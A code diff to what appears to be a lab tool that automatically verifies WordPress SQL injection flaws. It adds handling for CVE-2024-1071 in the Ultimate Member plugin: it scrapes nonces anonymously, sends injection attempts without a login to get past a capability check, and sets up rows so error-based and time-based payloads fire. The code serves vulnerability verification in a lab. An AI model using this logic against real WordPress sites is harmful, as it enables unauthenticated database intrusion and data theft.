@@ -292,6 +292,18 @@ _SQLI_CUSTOM_SORT_GATE = {
     "ultimate-member": {"meta_key": "_um_sortby_custom", "directory_id_param": "directory_id"},
 }
 
+# Plugins where the vulnerable AJAX endpoint is unauthenticated: CVE is exploitable WITHOUT
+# a logged-in user. The pipeline must therefore (a) scrape the nonce with an anonymous
+# session (no cookies) so the nonce is for user 0 and passes wp_verify_nonce for anonymous
+# requests, and (b) send all injection attempts anonymously. Using the subscriber session
+# for these plugins causes predefined_no_caps() (UM) or similar guards to short-circuit and
+# return empty results before the vulnerable SQL ever runs — confirmed in live lab:
+# CVE-2024-1071 / Ultimate Member: predefined_no_caps() fires for logged-in users lacking
+# can_view_all and exits with wp_send_json_success([]) before WP_User_Query is built.
+_SQLI_ANON_ATTACK_SLUGS: set = {
+    "ultimate-member",
+}
+
 
 def _resolve_endpoint_placeholders(endpoint: str, html_sources: list) -> tuple:
     """Si `endpoint` trae un placeholder literal sin resolver tal cual vino de un PoC publico
@@ -409,7 +421,12 @@ def _auto_resolve_wp_blockers(boot: "_LabSession", lab: "_Lab", slug: str, http_
     # directamente -- más rápido y fiable que la fuerza bruta ciega.
     gate_cfg = _SQLI_CUSTOM_SORT_GATE.get(slug, {})
     dir_id_param = gate_cfg.get("directory_id_param", "")
-    if dir_id_param and dir_id_param != exclude_param and dir_id_param not in base_params:
+    # Resolve even when already in base_params with a plain-digit placeholder (e.g. "1" from
+    # the PoC default) — the placeholder is useless and will always cause "Wrong member
+    # directory data"; the real hash must come from WP-CLI or brute-force, not from the PoC.
+    _dir_id_is_placeholder = str(base_params.get(dir_id_param, "")).isdigit()
+    if dir_id_param and dir_id_param != exclude_param and (
+            dir_id_param not in base_params or _dir_id_is_placeholder):
         # Intentar primero resolverlo via WP-CLI (tenemos el lab disponible):
         # buscar el primer post del CPT del plugin (um_directory) y derivar su hash.
         cpt_name = _PLUGIN_DIRECTORY_CPT.get(slug, "")
@@ -1500,6 +1517,15 @@ def _bootstrap_lab(lab: "_Lab", plugin_source_dir: str, slug: str, step, res: Wp
             lab.wp_cli("post", "meta", "update", dir_post_id, "_um_hash", _um_hashed,
                        timeout=15)
             step(f"_um_hash='{_um_hashed}' escrito en el post {dir_post_id} (UM: get_directory_by_hash)")
+            # Approve the admin user (ID=1) so the directory has at least one visible member.
+            # Without an approved user the ORDER BY clause is never evaluated — MySQL skips
+            # ORDER BY on empty result sets, so error-based and time-based injections both
+            # return nothing detectable. CVE-2024-1071 is unauthenticated; predefined_no_caps()
+            # is bypassed when the request arrives without cookies, but the query still needs
+            # rows to sort for extractvalue() / SLEEP() to execute.
+            lab.wp_cli("user", "meta", "update", "1", "_um_status", "approved", timeout=10)
+            lab.wp_cli("user", "meta", "update", "1", "account_status", "approved", timeout=10)
+            step("admin (ID=1) marcado como UM-approved -- necesario para que ORDER BY se evalúe")
 
     # For UM-style plugins the shortcode that embeds the DIRECTORY (not the login form)
     # must reference the actual CPT post ID so the AJAX nonce for um_get_members is
@@ -2877,13 +2903,46 @@ def verify_wordpress_sqli(
                      f"'{gate['meta_key']}' del recurso real (post {gate_post_id}) -- se "
                      f"sincronizara esa meta con cada valor probado antes de enviarlo")
 
+        # For plugins where the vulnerable endpoint is unauthenticated (see
+        # _SQLI_ANON_ATTACK_SLUGS), predefined_no_caps() or similar guards short-circuit and
+        # return empty when a logged-in user WITHOUT the required capability sends the request.
+        # Use a fresh anonymous session instead — no cookies, nonce scraped anonymously from
+        # the directory page so it verifies for user 0.
+        import requests as _requests_mod
+        _anon_attack = slug in _SQLI_ANON_ATTACK_SLUGS
+        _attack_sess = boot.sub_sess
+        if _anon_attack:
+            _attack_sess = _requests_mod.Session()
+            _attack_sess.headers.update({"User-Agent": "Mozilla/5.0 binoracle-lab"})
+            # Re-scrape nonce anonymously (nonce is user-specific — sub nonce ≠ anon nonce).
+            _anon_nonce_pages = list(extra_nonce_pages or [])
+            if boot.shortcode_page_path and boot.shortcode_page_path not in _anon_nonce_pages:
+                _anon_nonce_pages.insert(0, boot.shortcode_page_path)
+            if not _anon_nonce_pages:
+                _anon_nonce_pages = ["/"]
+            for _np in _anon_nonce_pages:
+                try:
+                    _nr = _attack_sess.get(boot.base_url + _np, timeout=15)
+                    _anon_nonce_m = re.search(
+                        r'(?:nonce|security)["\']?\s*[:=]\s*["\']([a-f0-9]{8,16})["\']',
+                        _nr.text or "", re.I)
+                    if _anon_nonce_m:
+                        for nk in list(base_params.keys()):
+                            if any(h in nk.lower() for h in ("nonce", "security", "token")):
+                                base_params[nk] = _anon_nonce_m.group(1)
+                                break
+                        step(f"nonce anonimo (usuario 0) raspado de '{_np}' para sesion anonima")
+                        break
+                except Exception:
+                    pass
+
         def send(val):
             if gate_post_id is not None:
                 lab.wp_cli("post", "meta", "update", str(gate_post_id), gate["meta_key"], val,
                           timeout=15)
             payload = dict(base_params)
             payload[sqli_param] = val
-            return boot.sub_sess.request(m, boot.base_url + endpoint,
+            return _attack_sess.request(m, boot.base_url + endpoint,
                                data=payload if m != "GET" else None,
                                params=payload if m == "GET" else None, timeout=20)
 
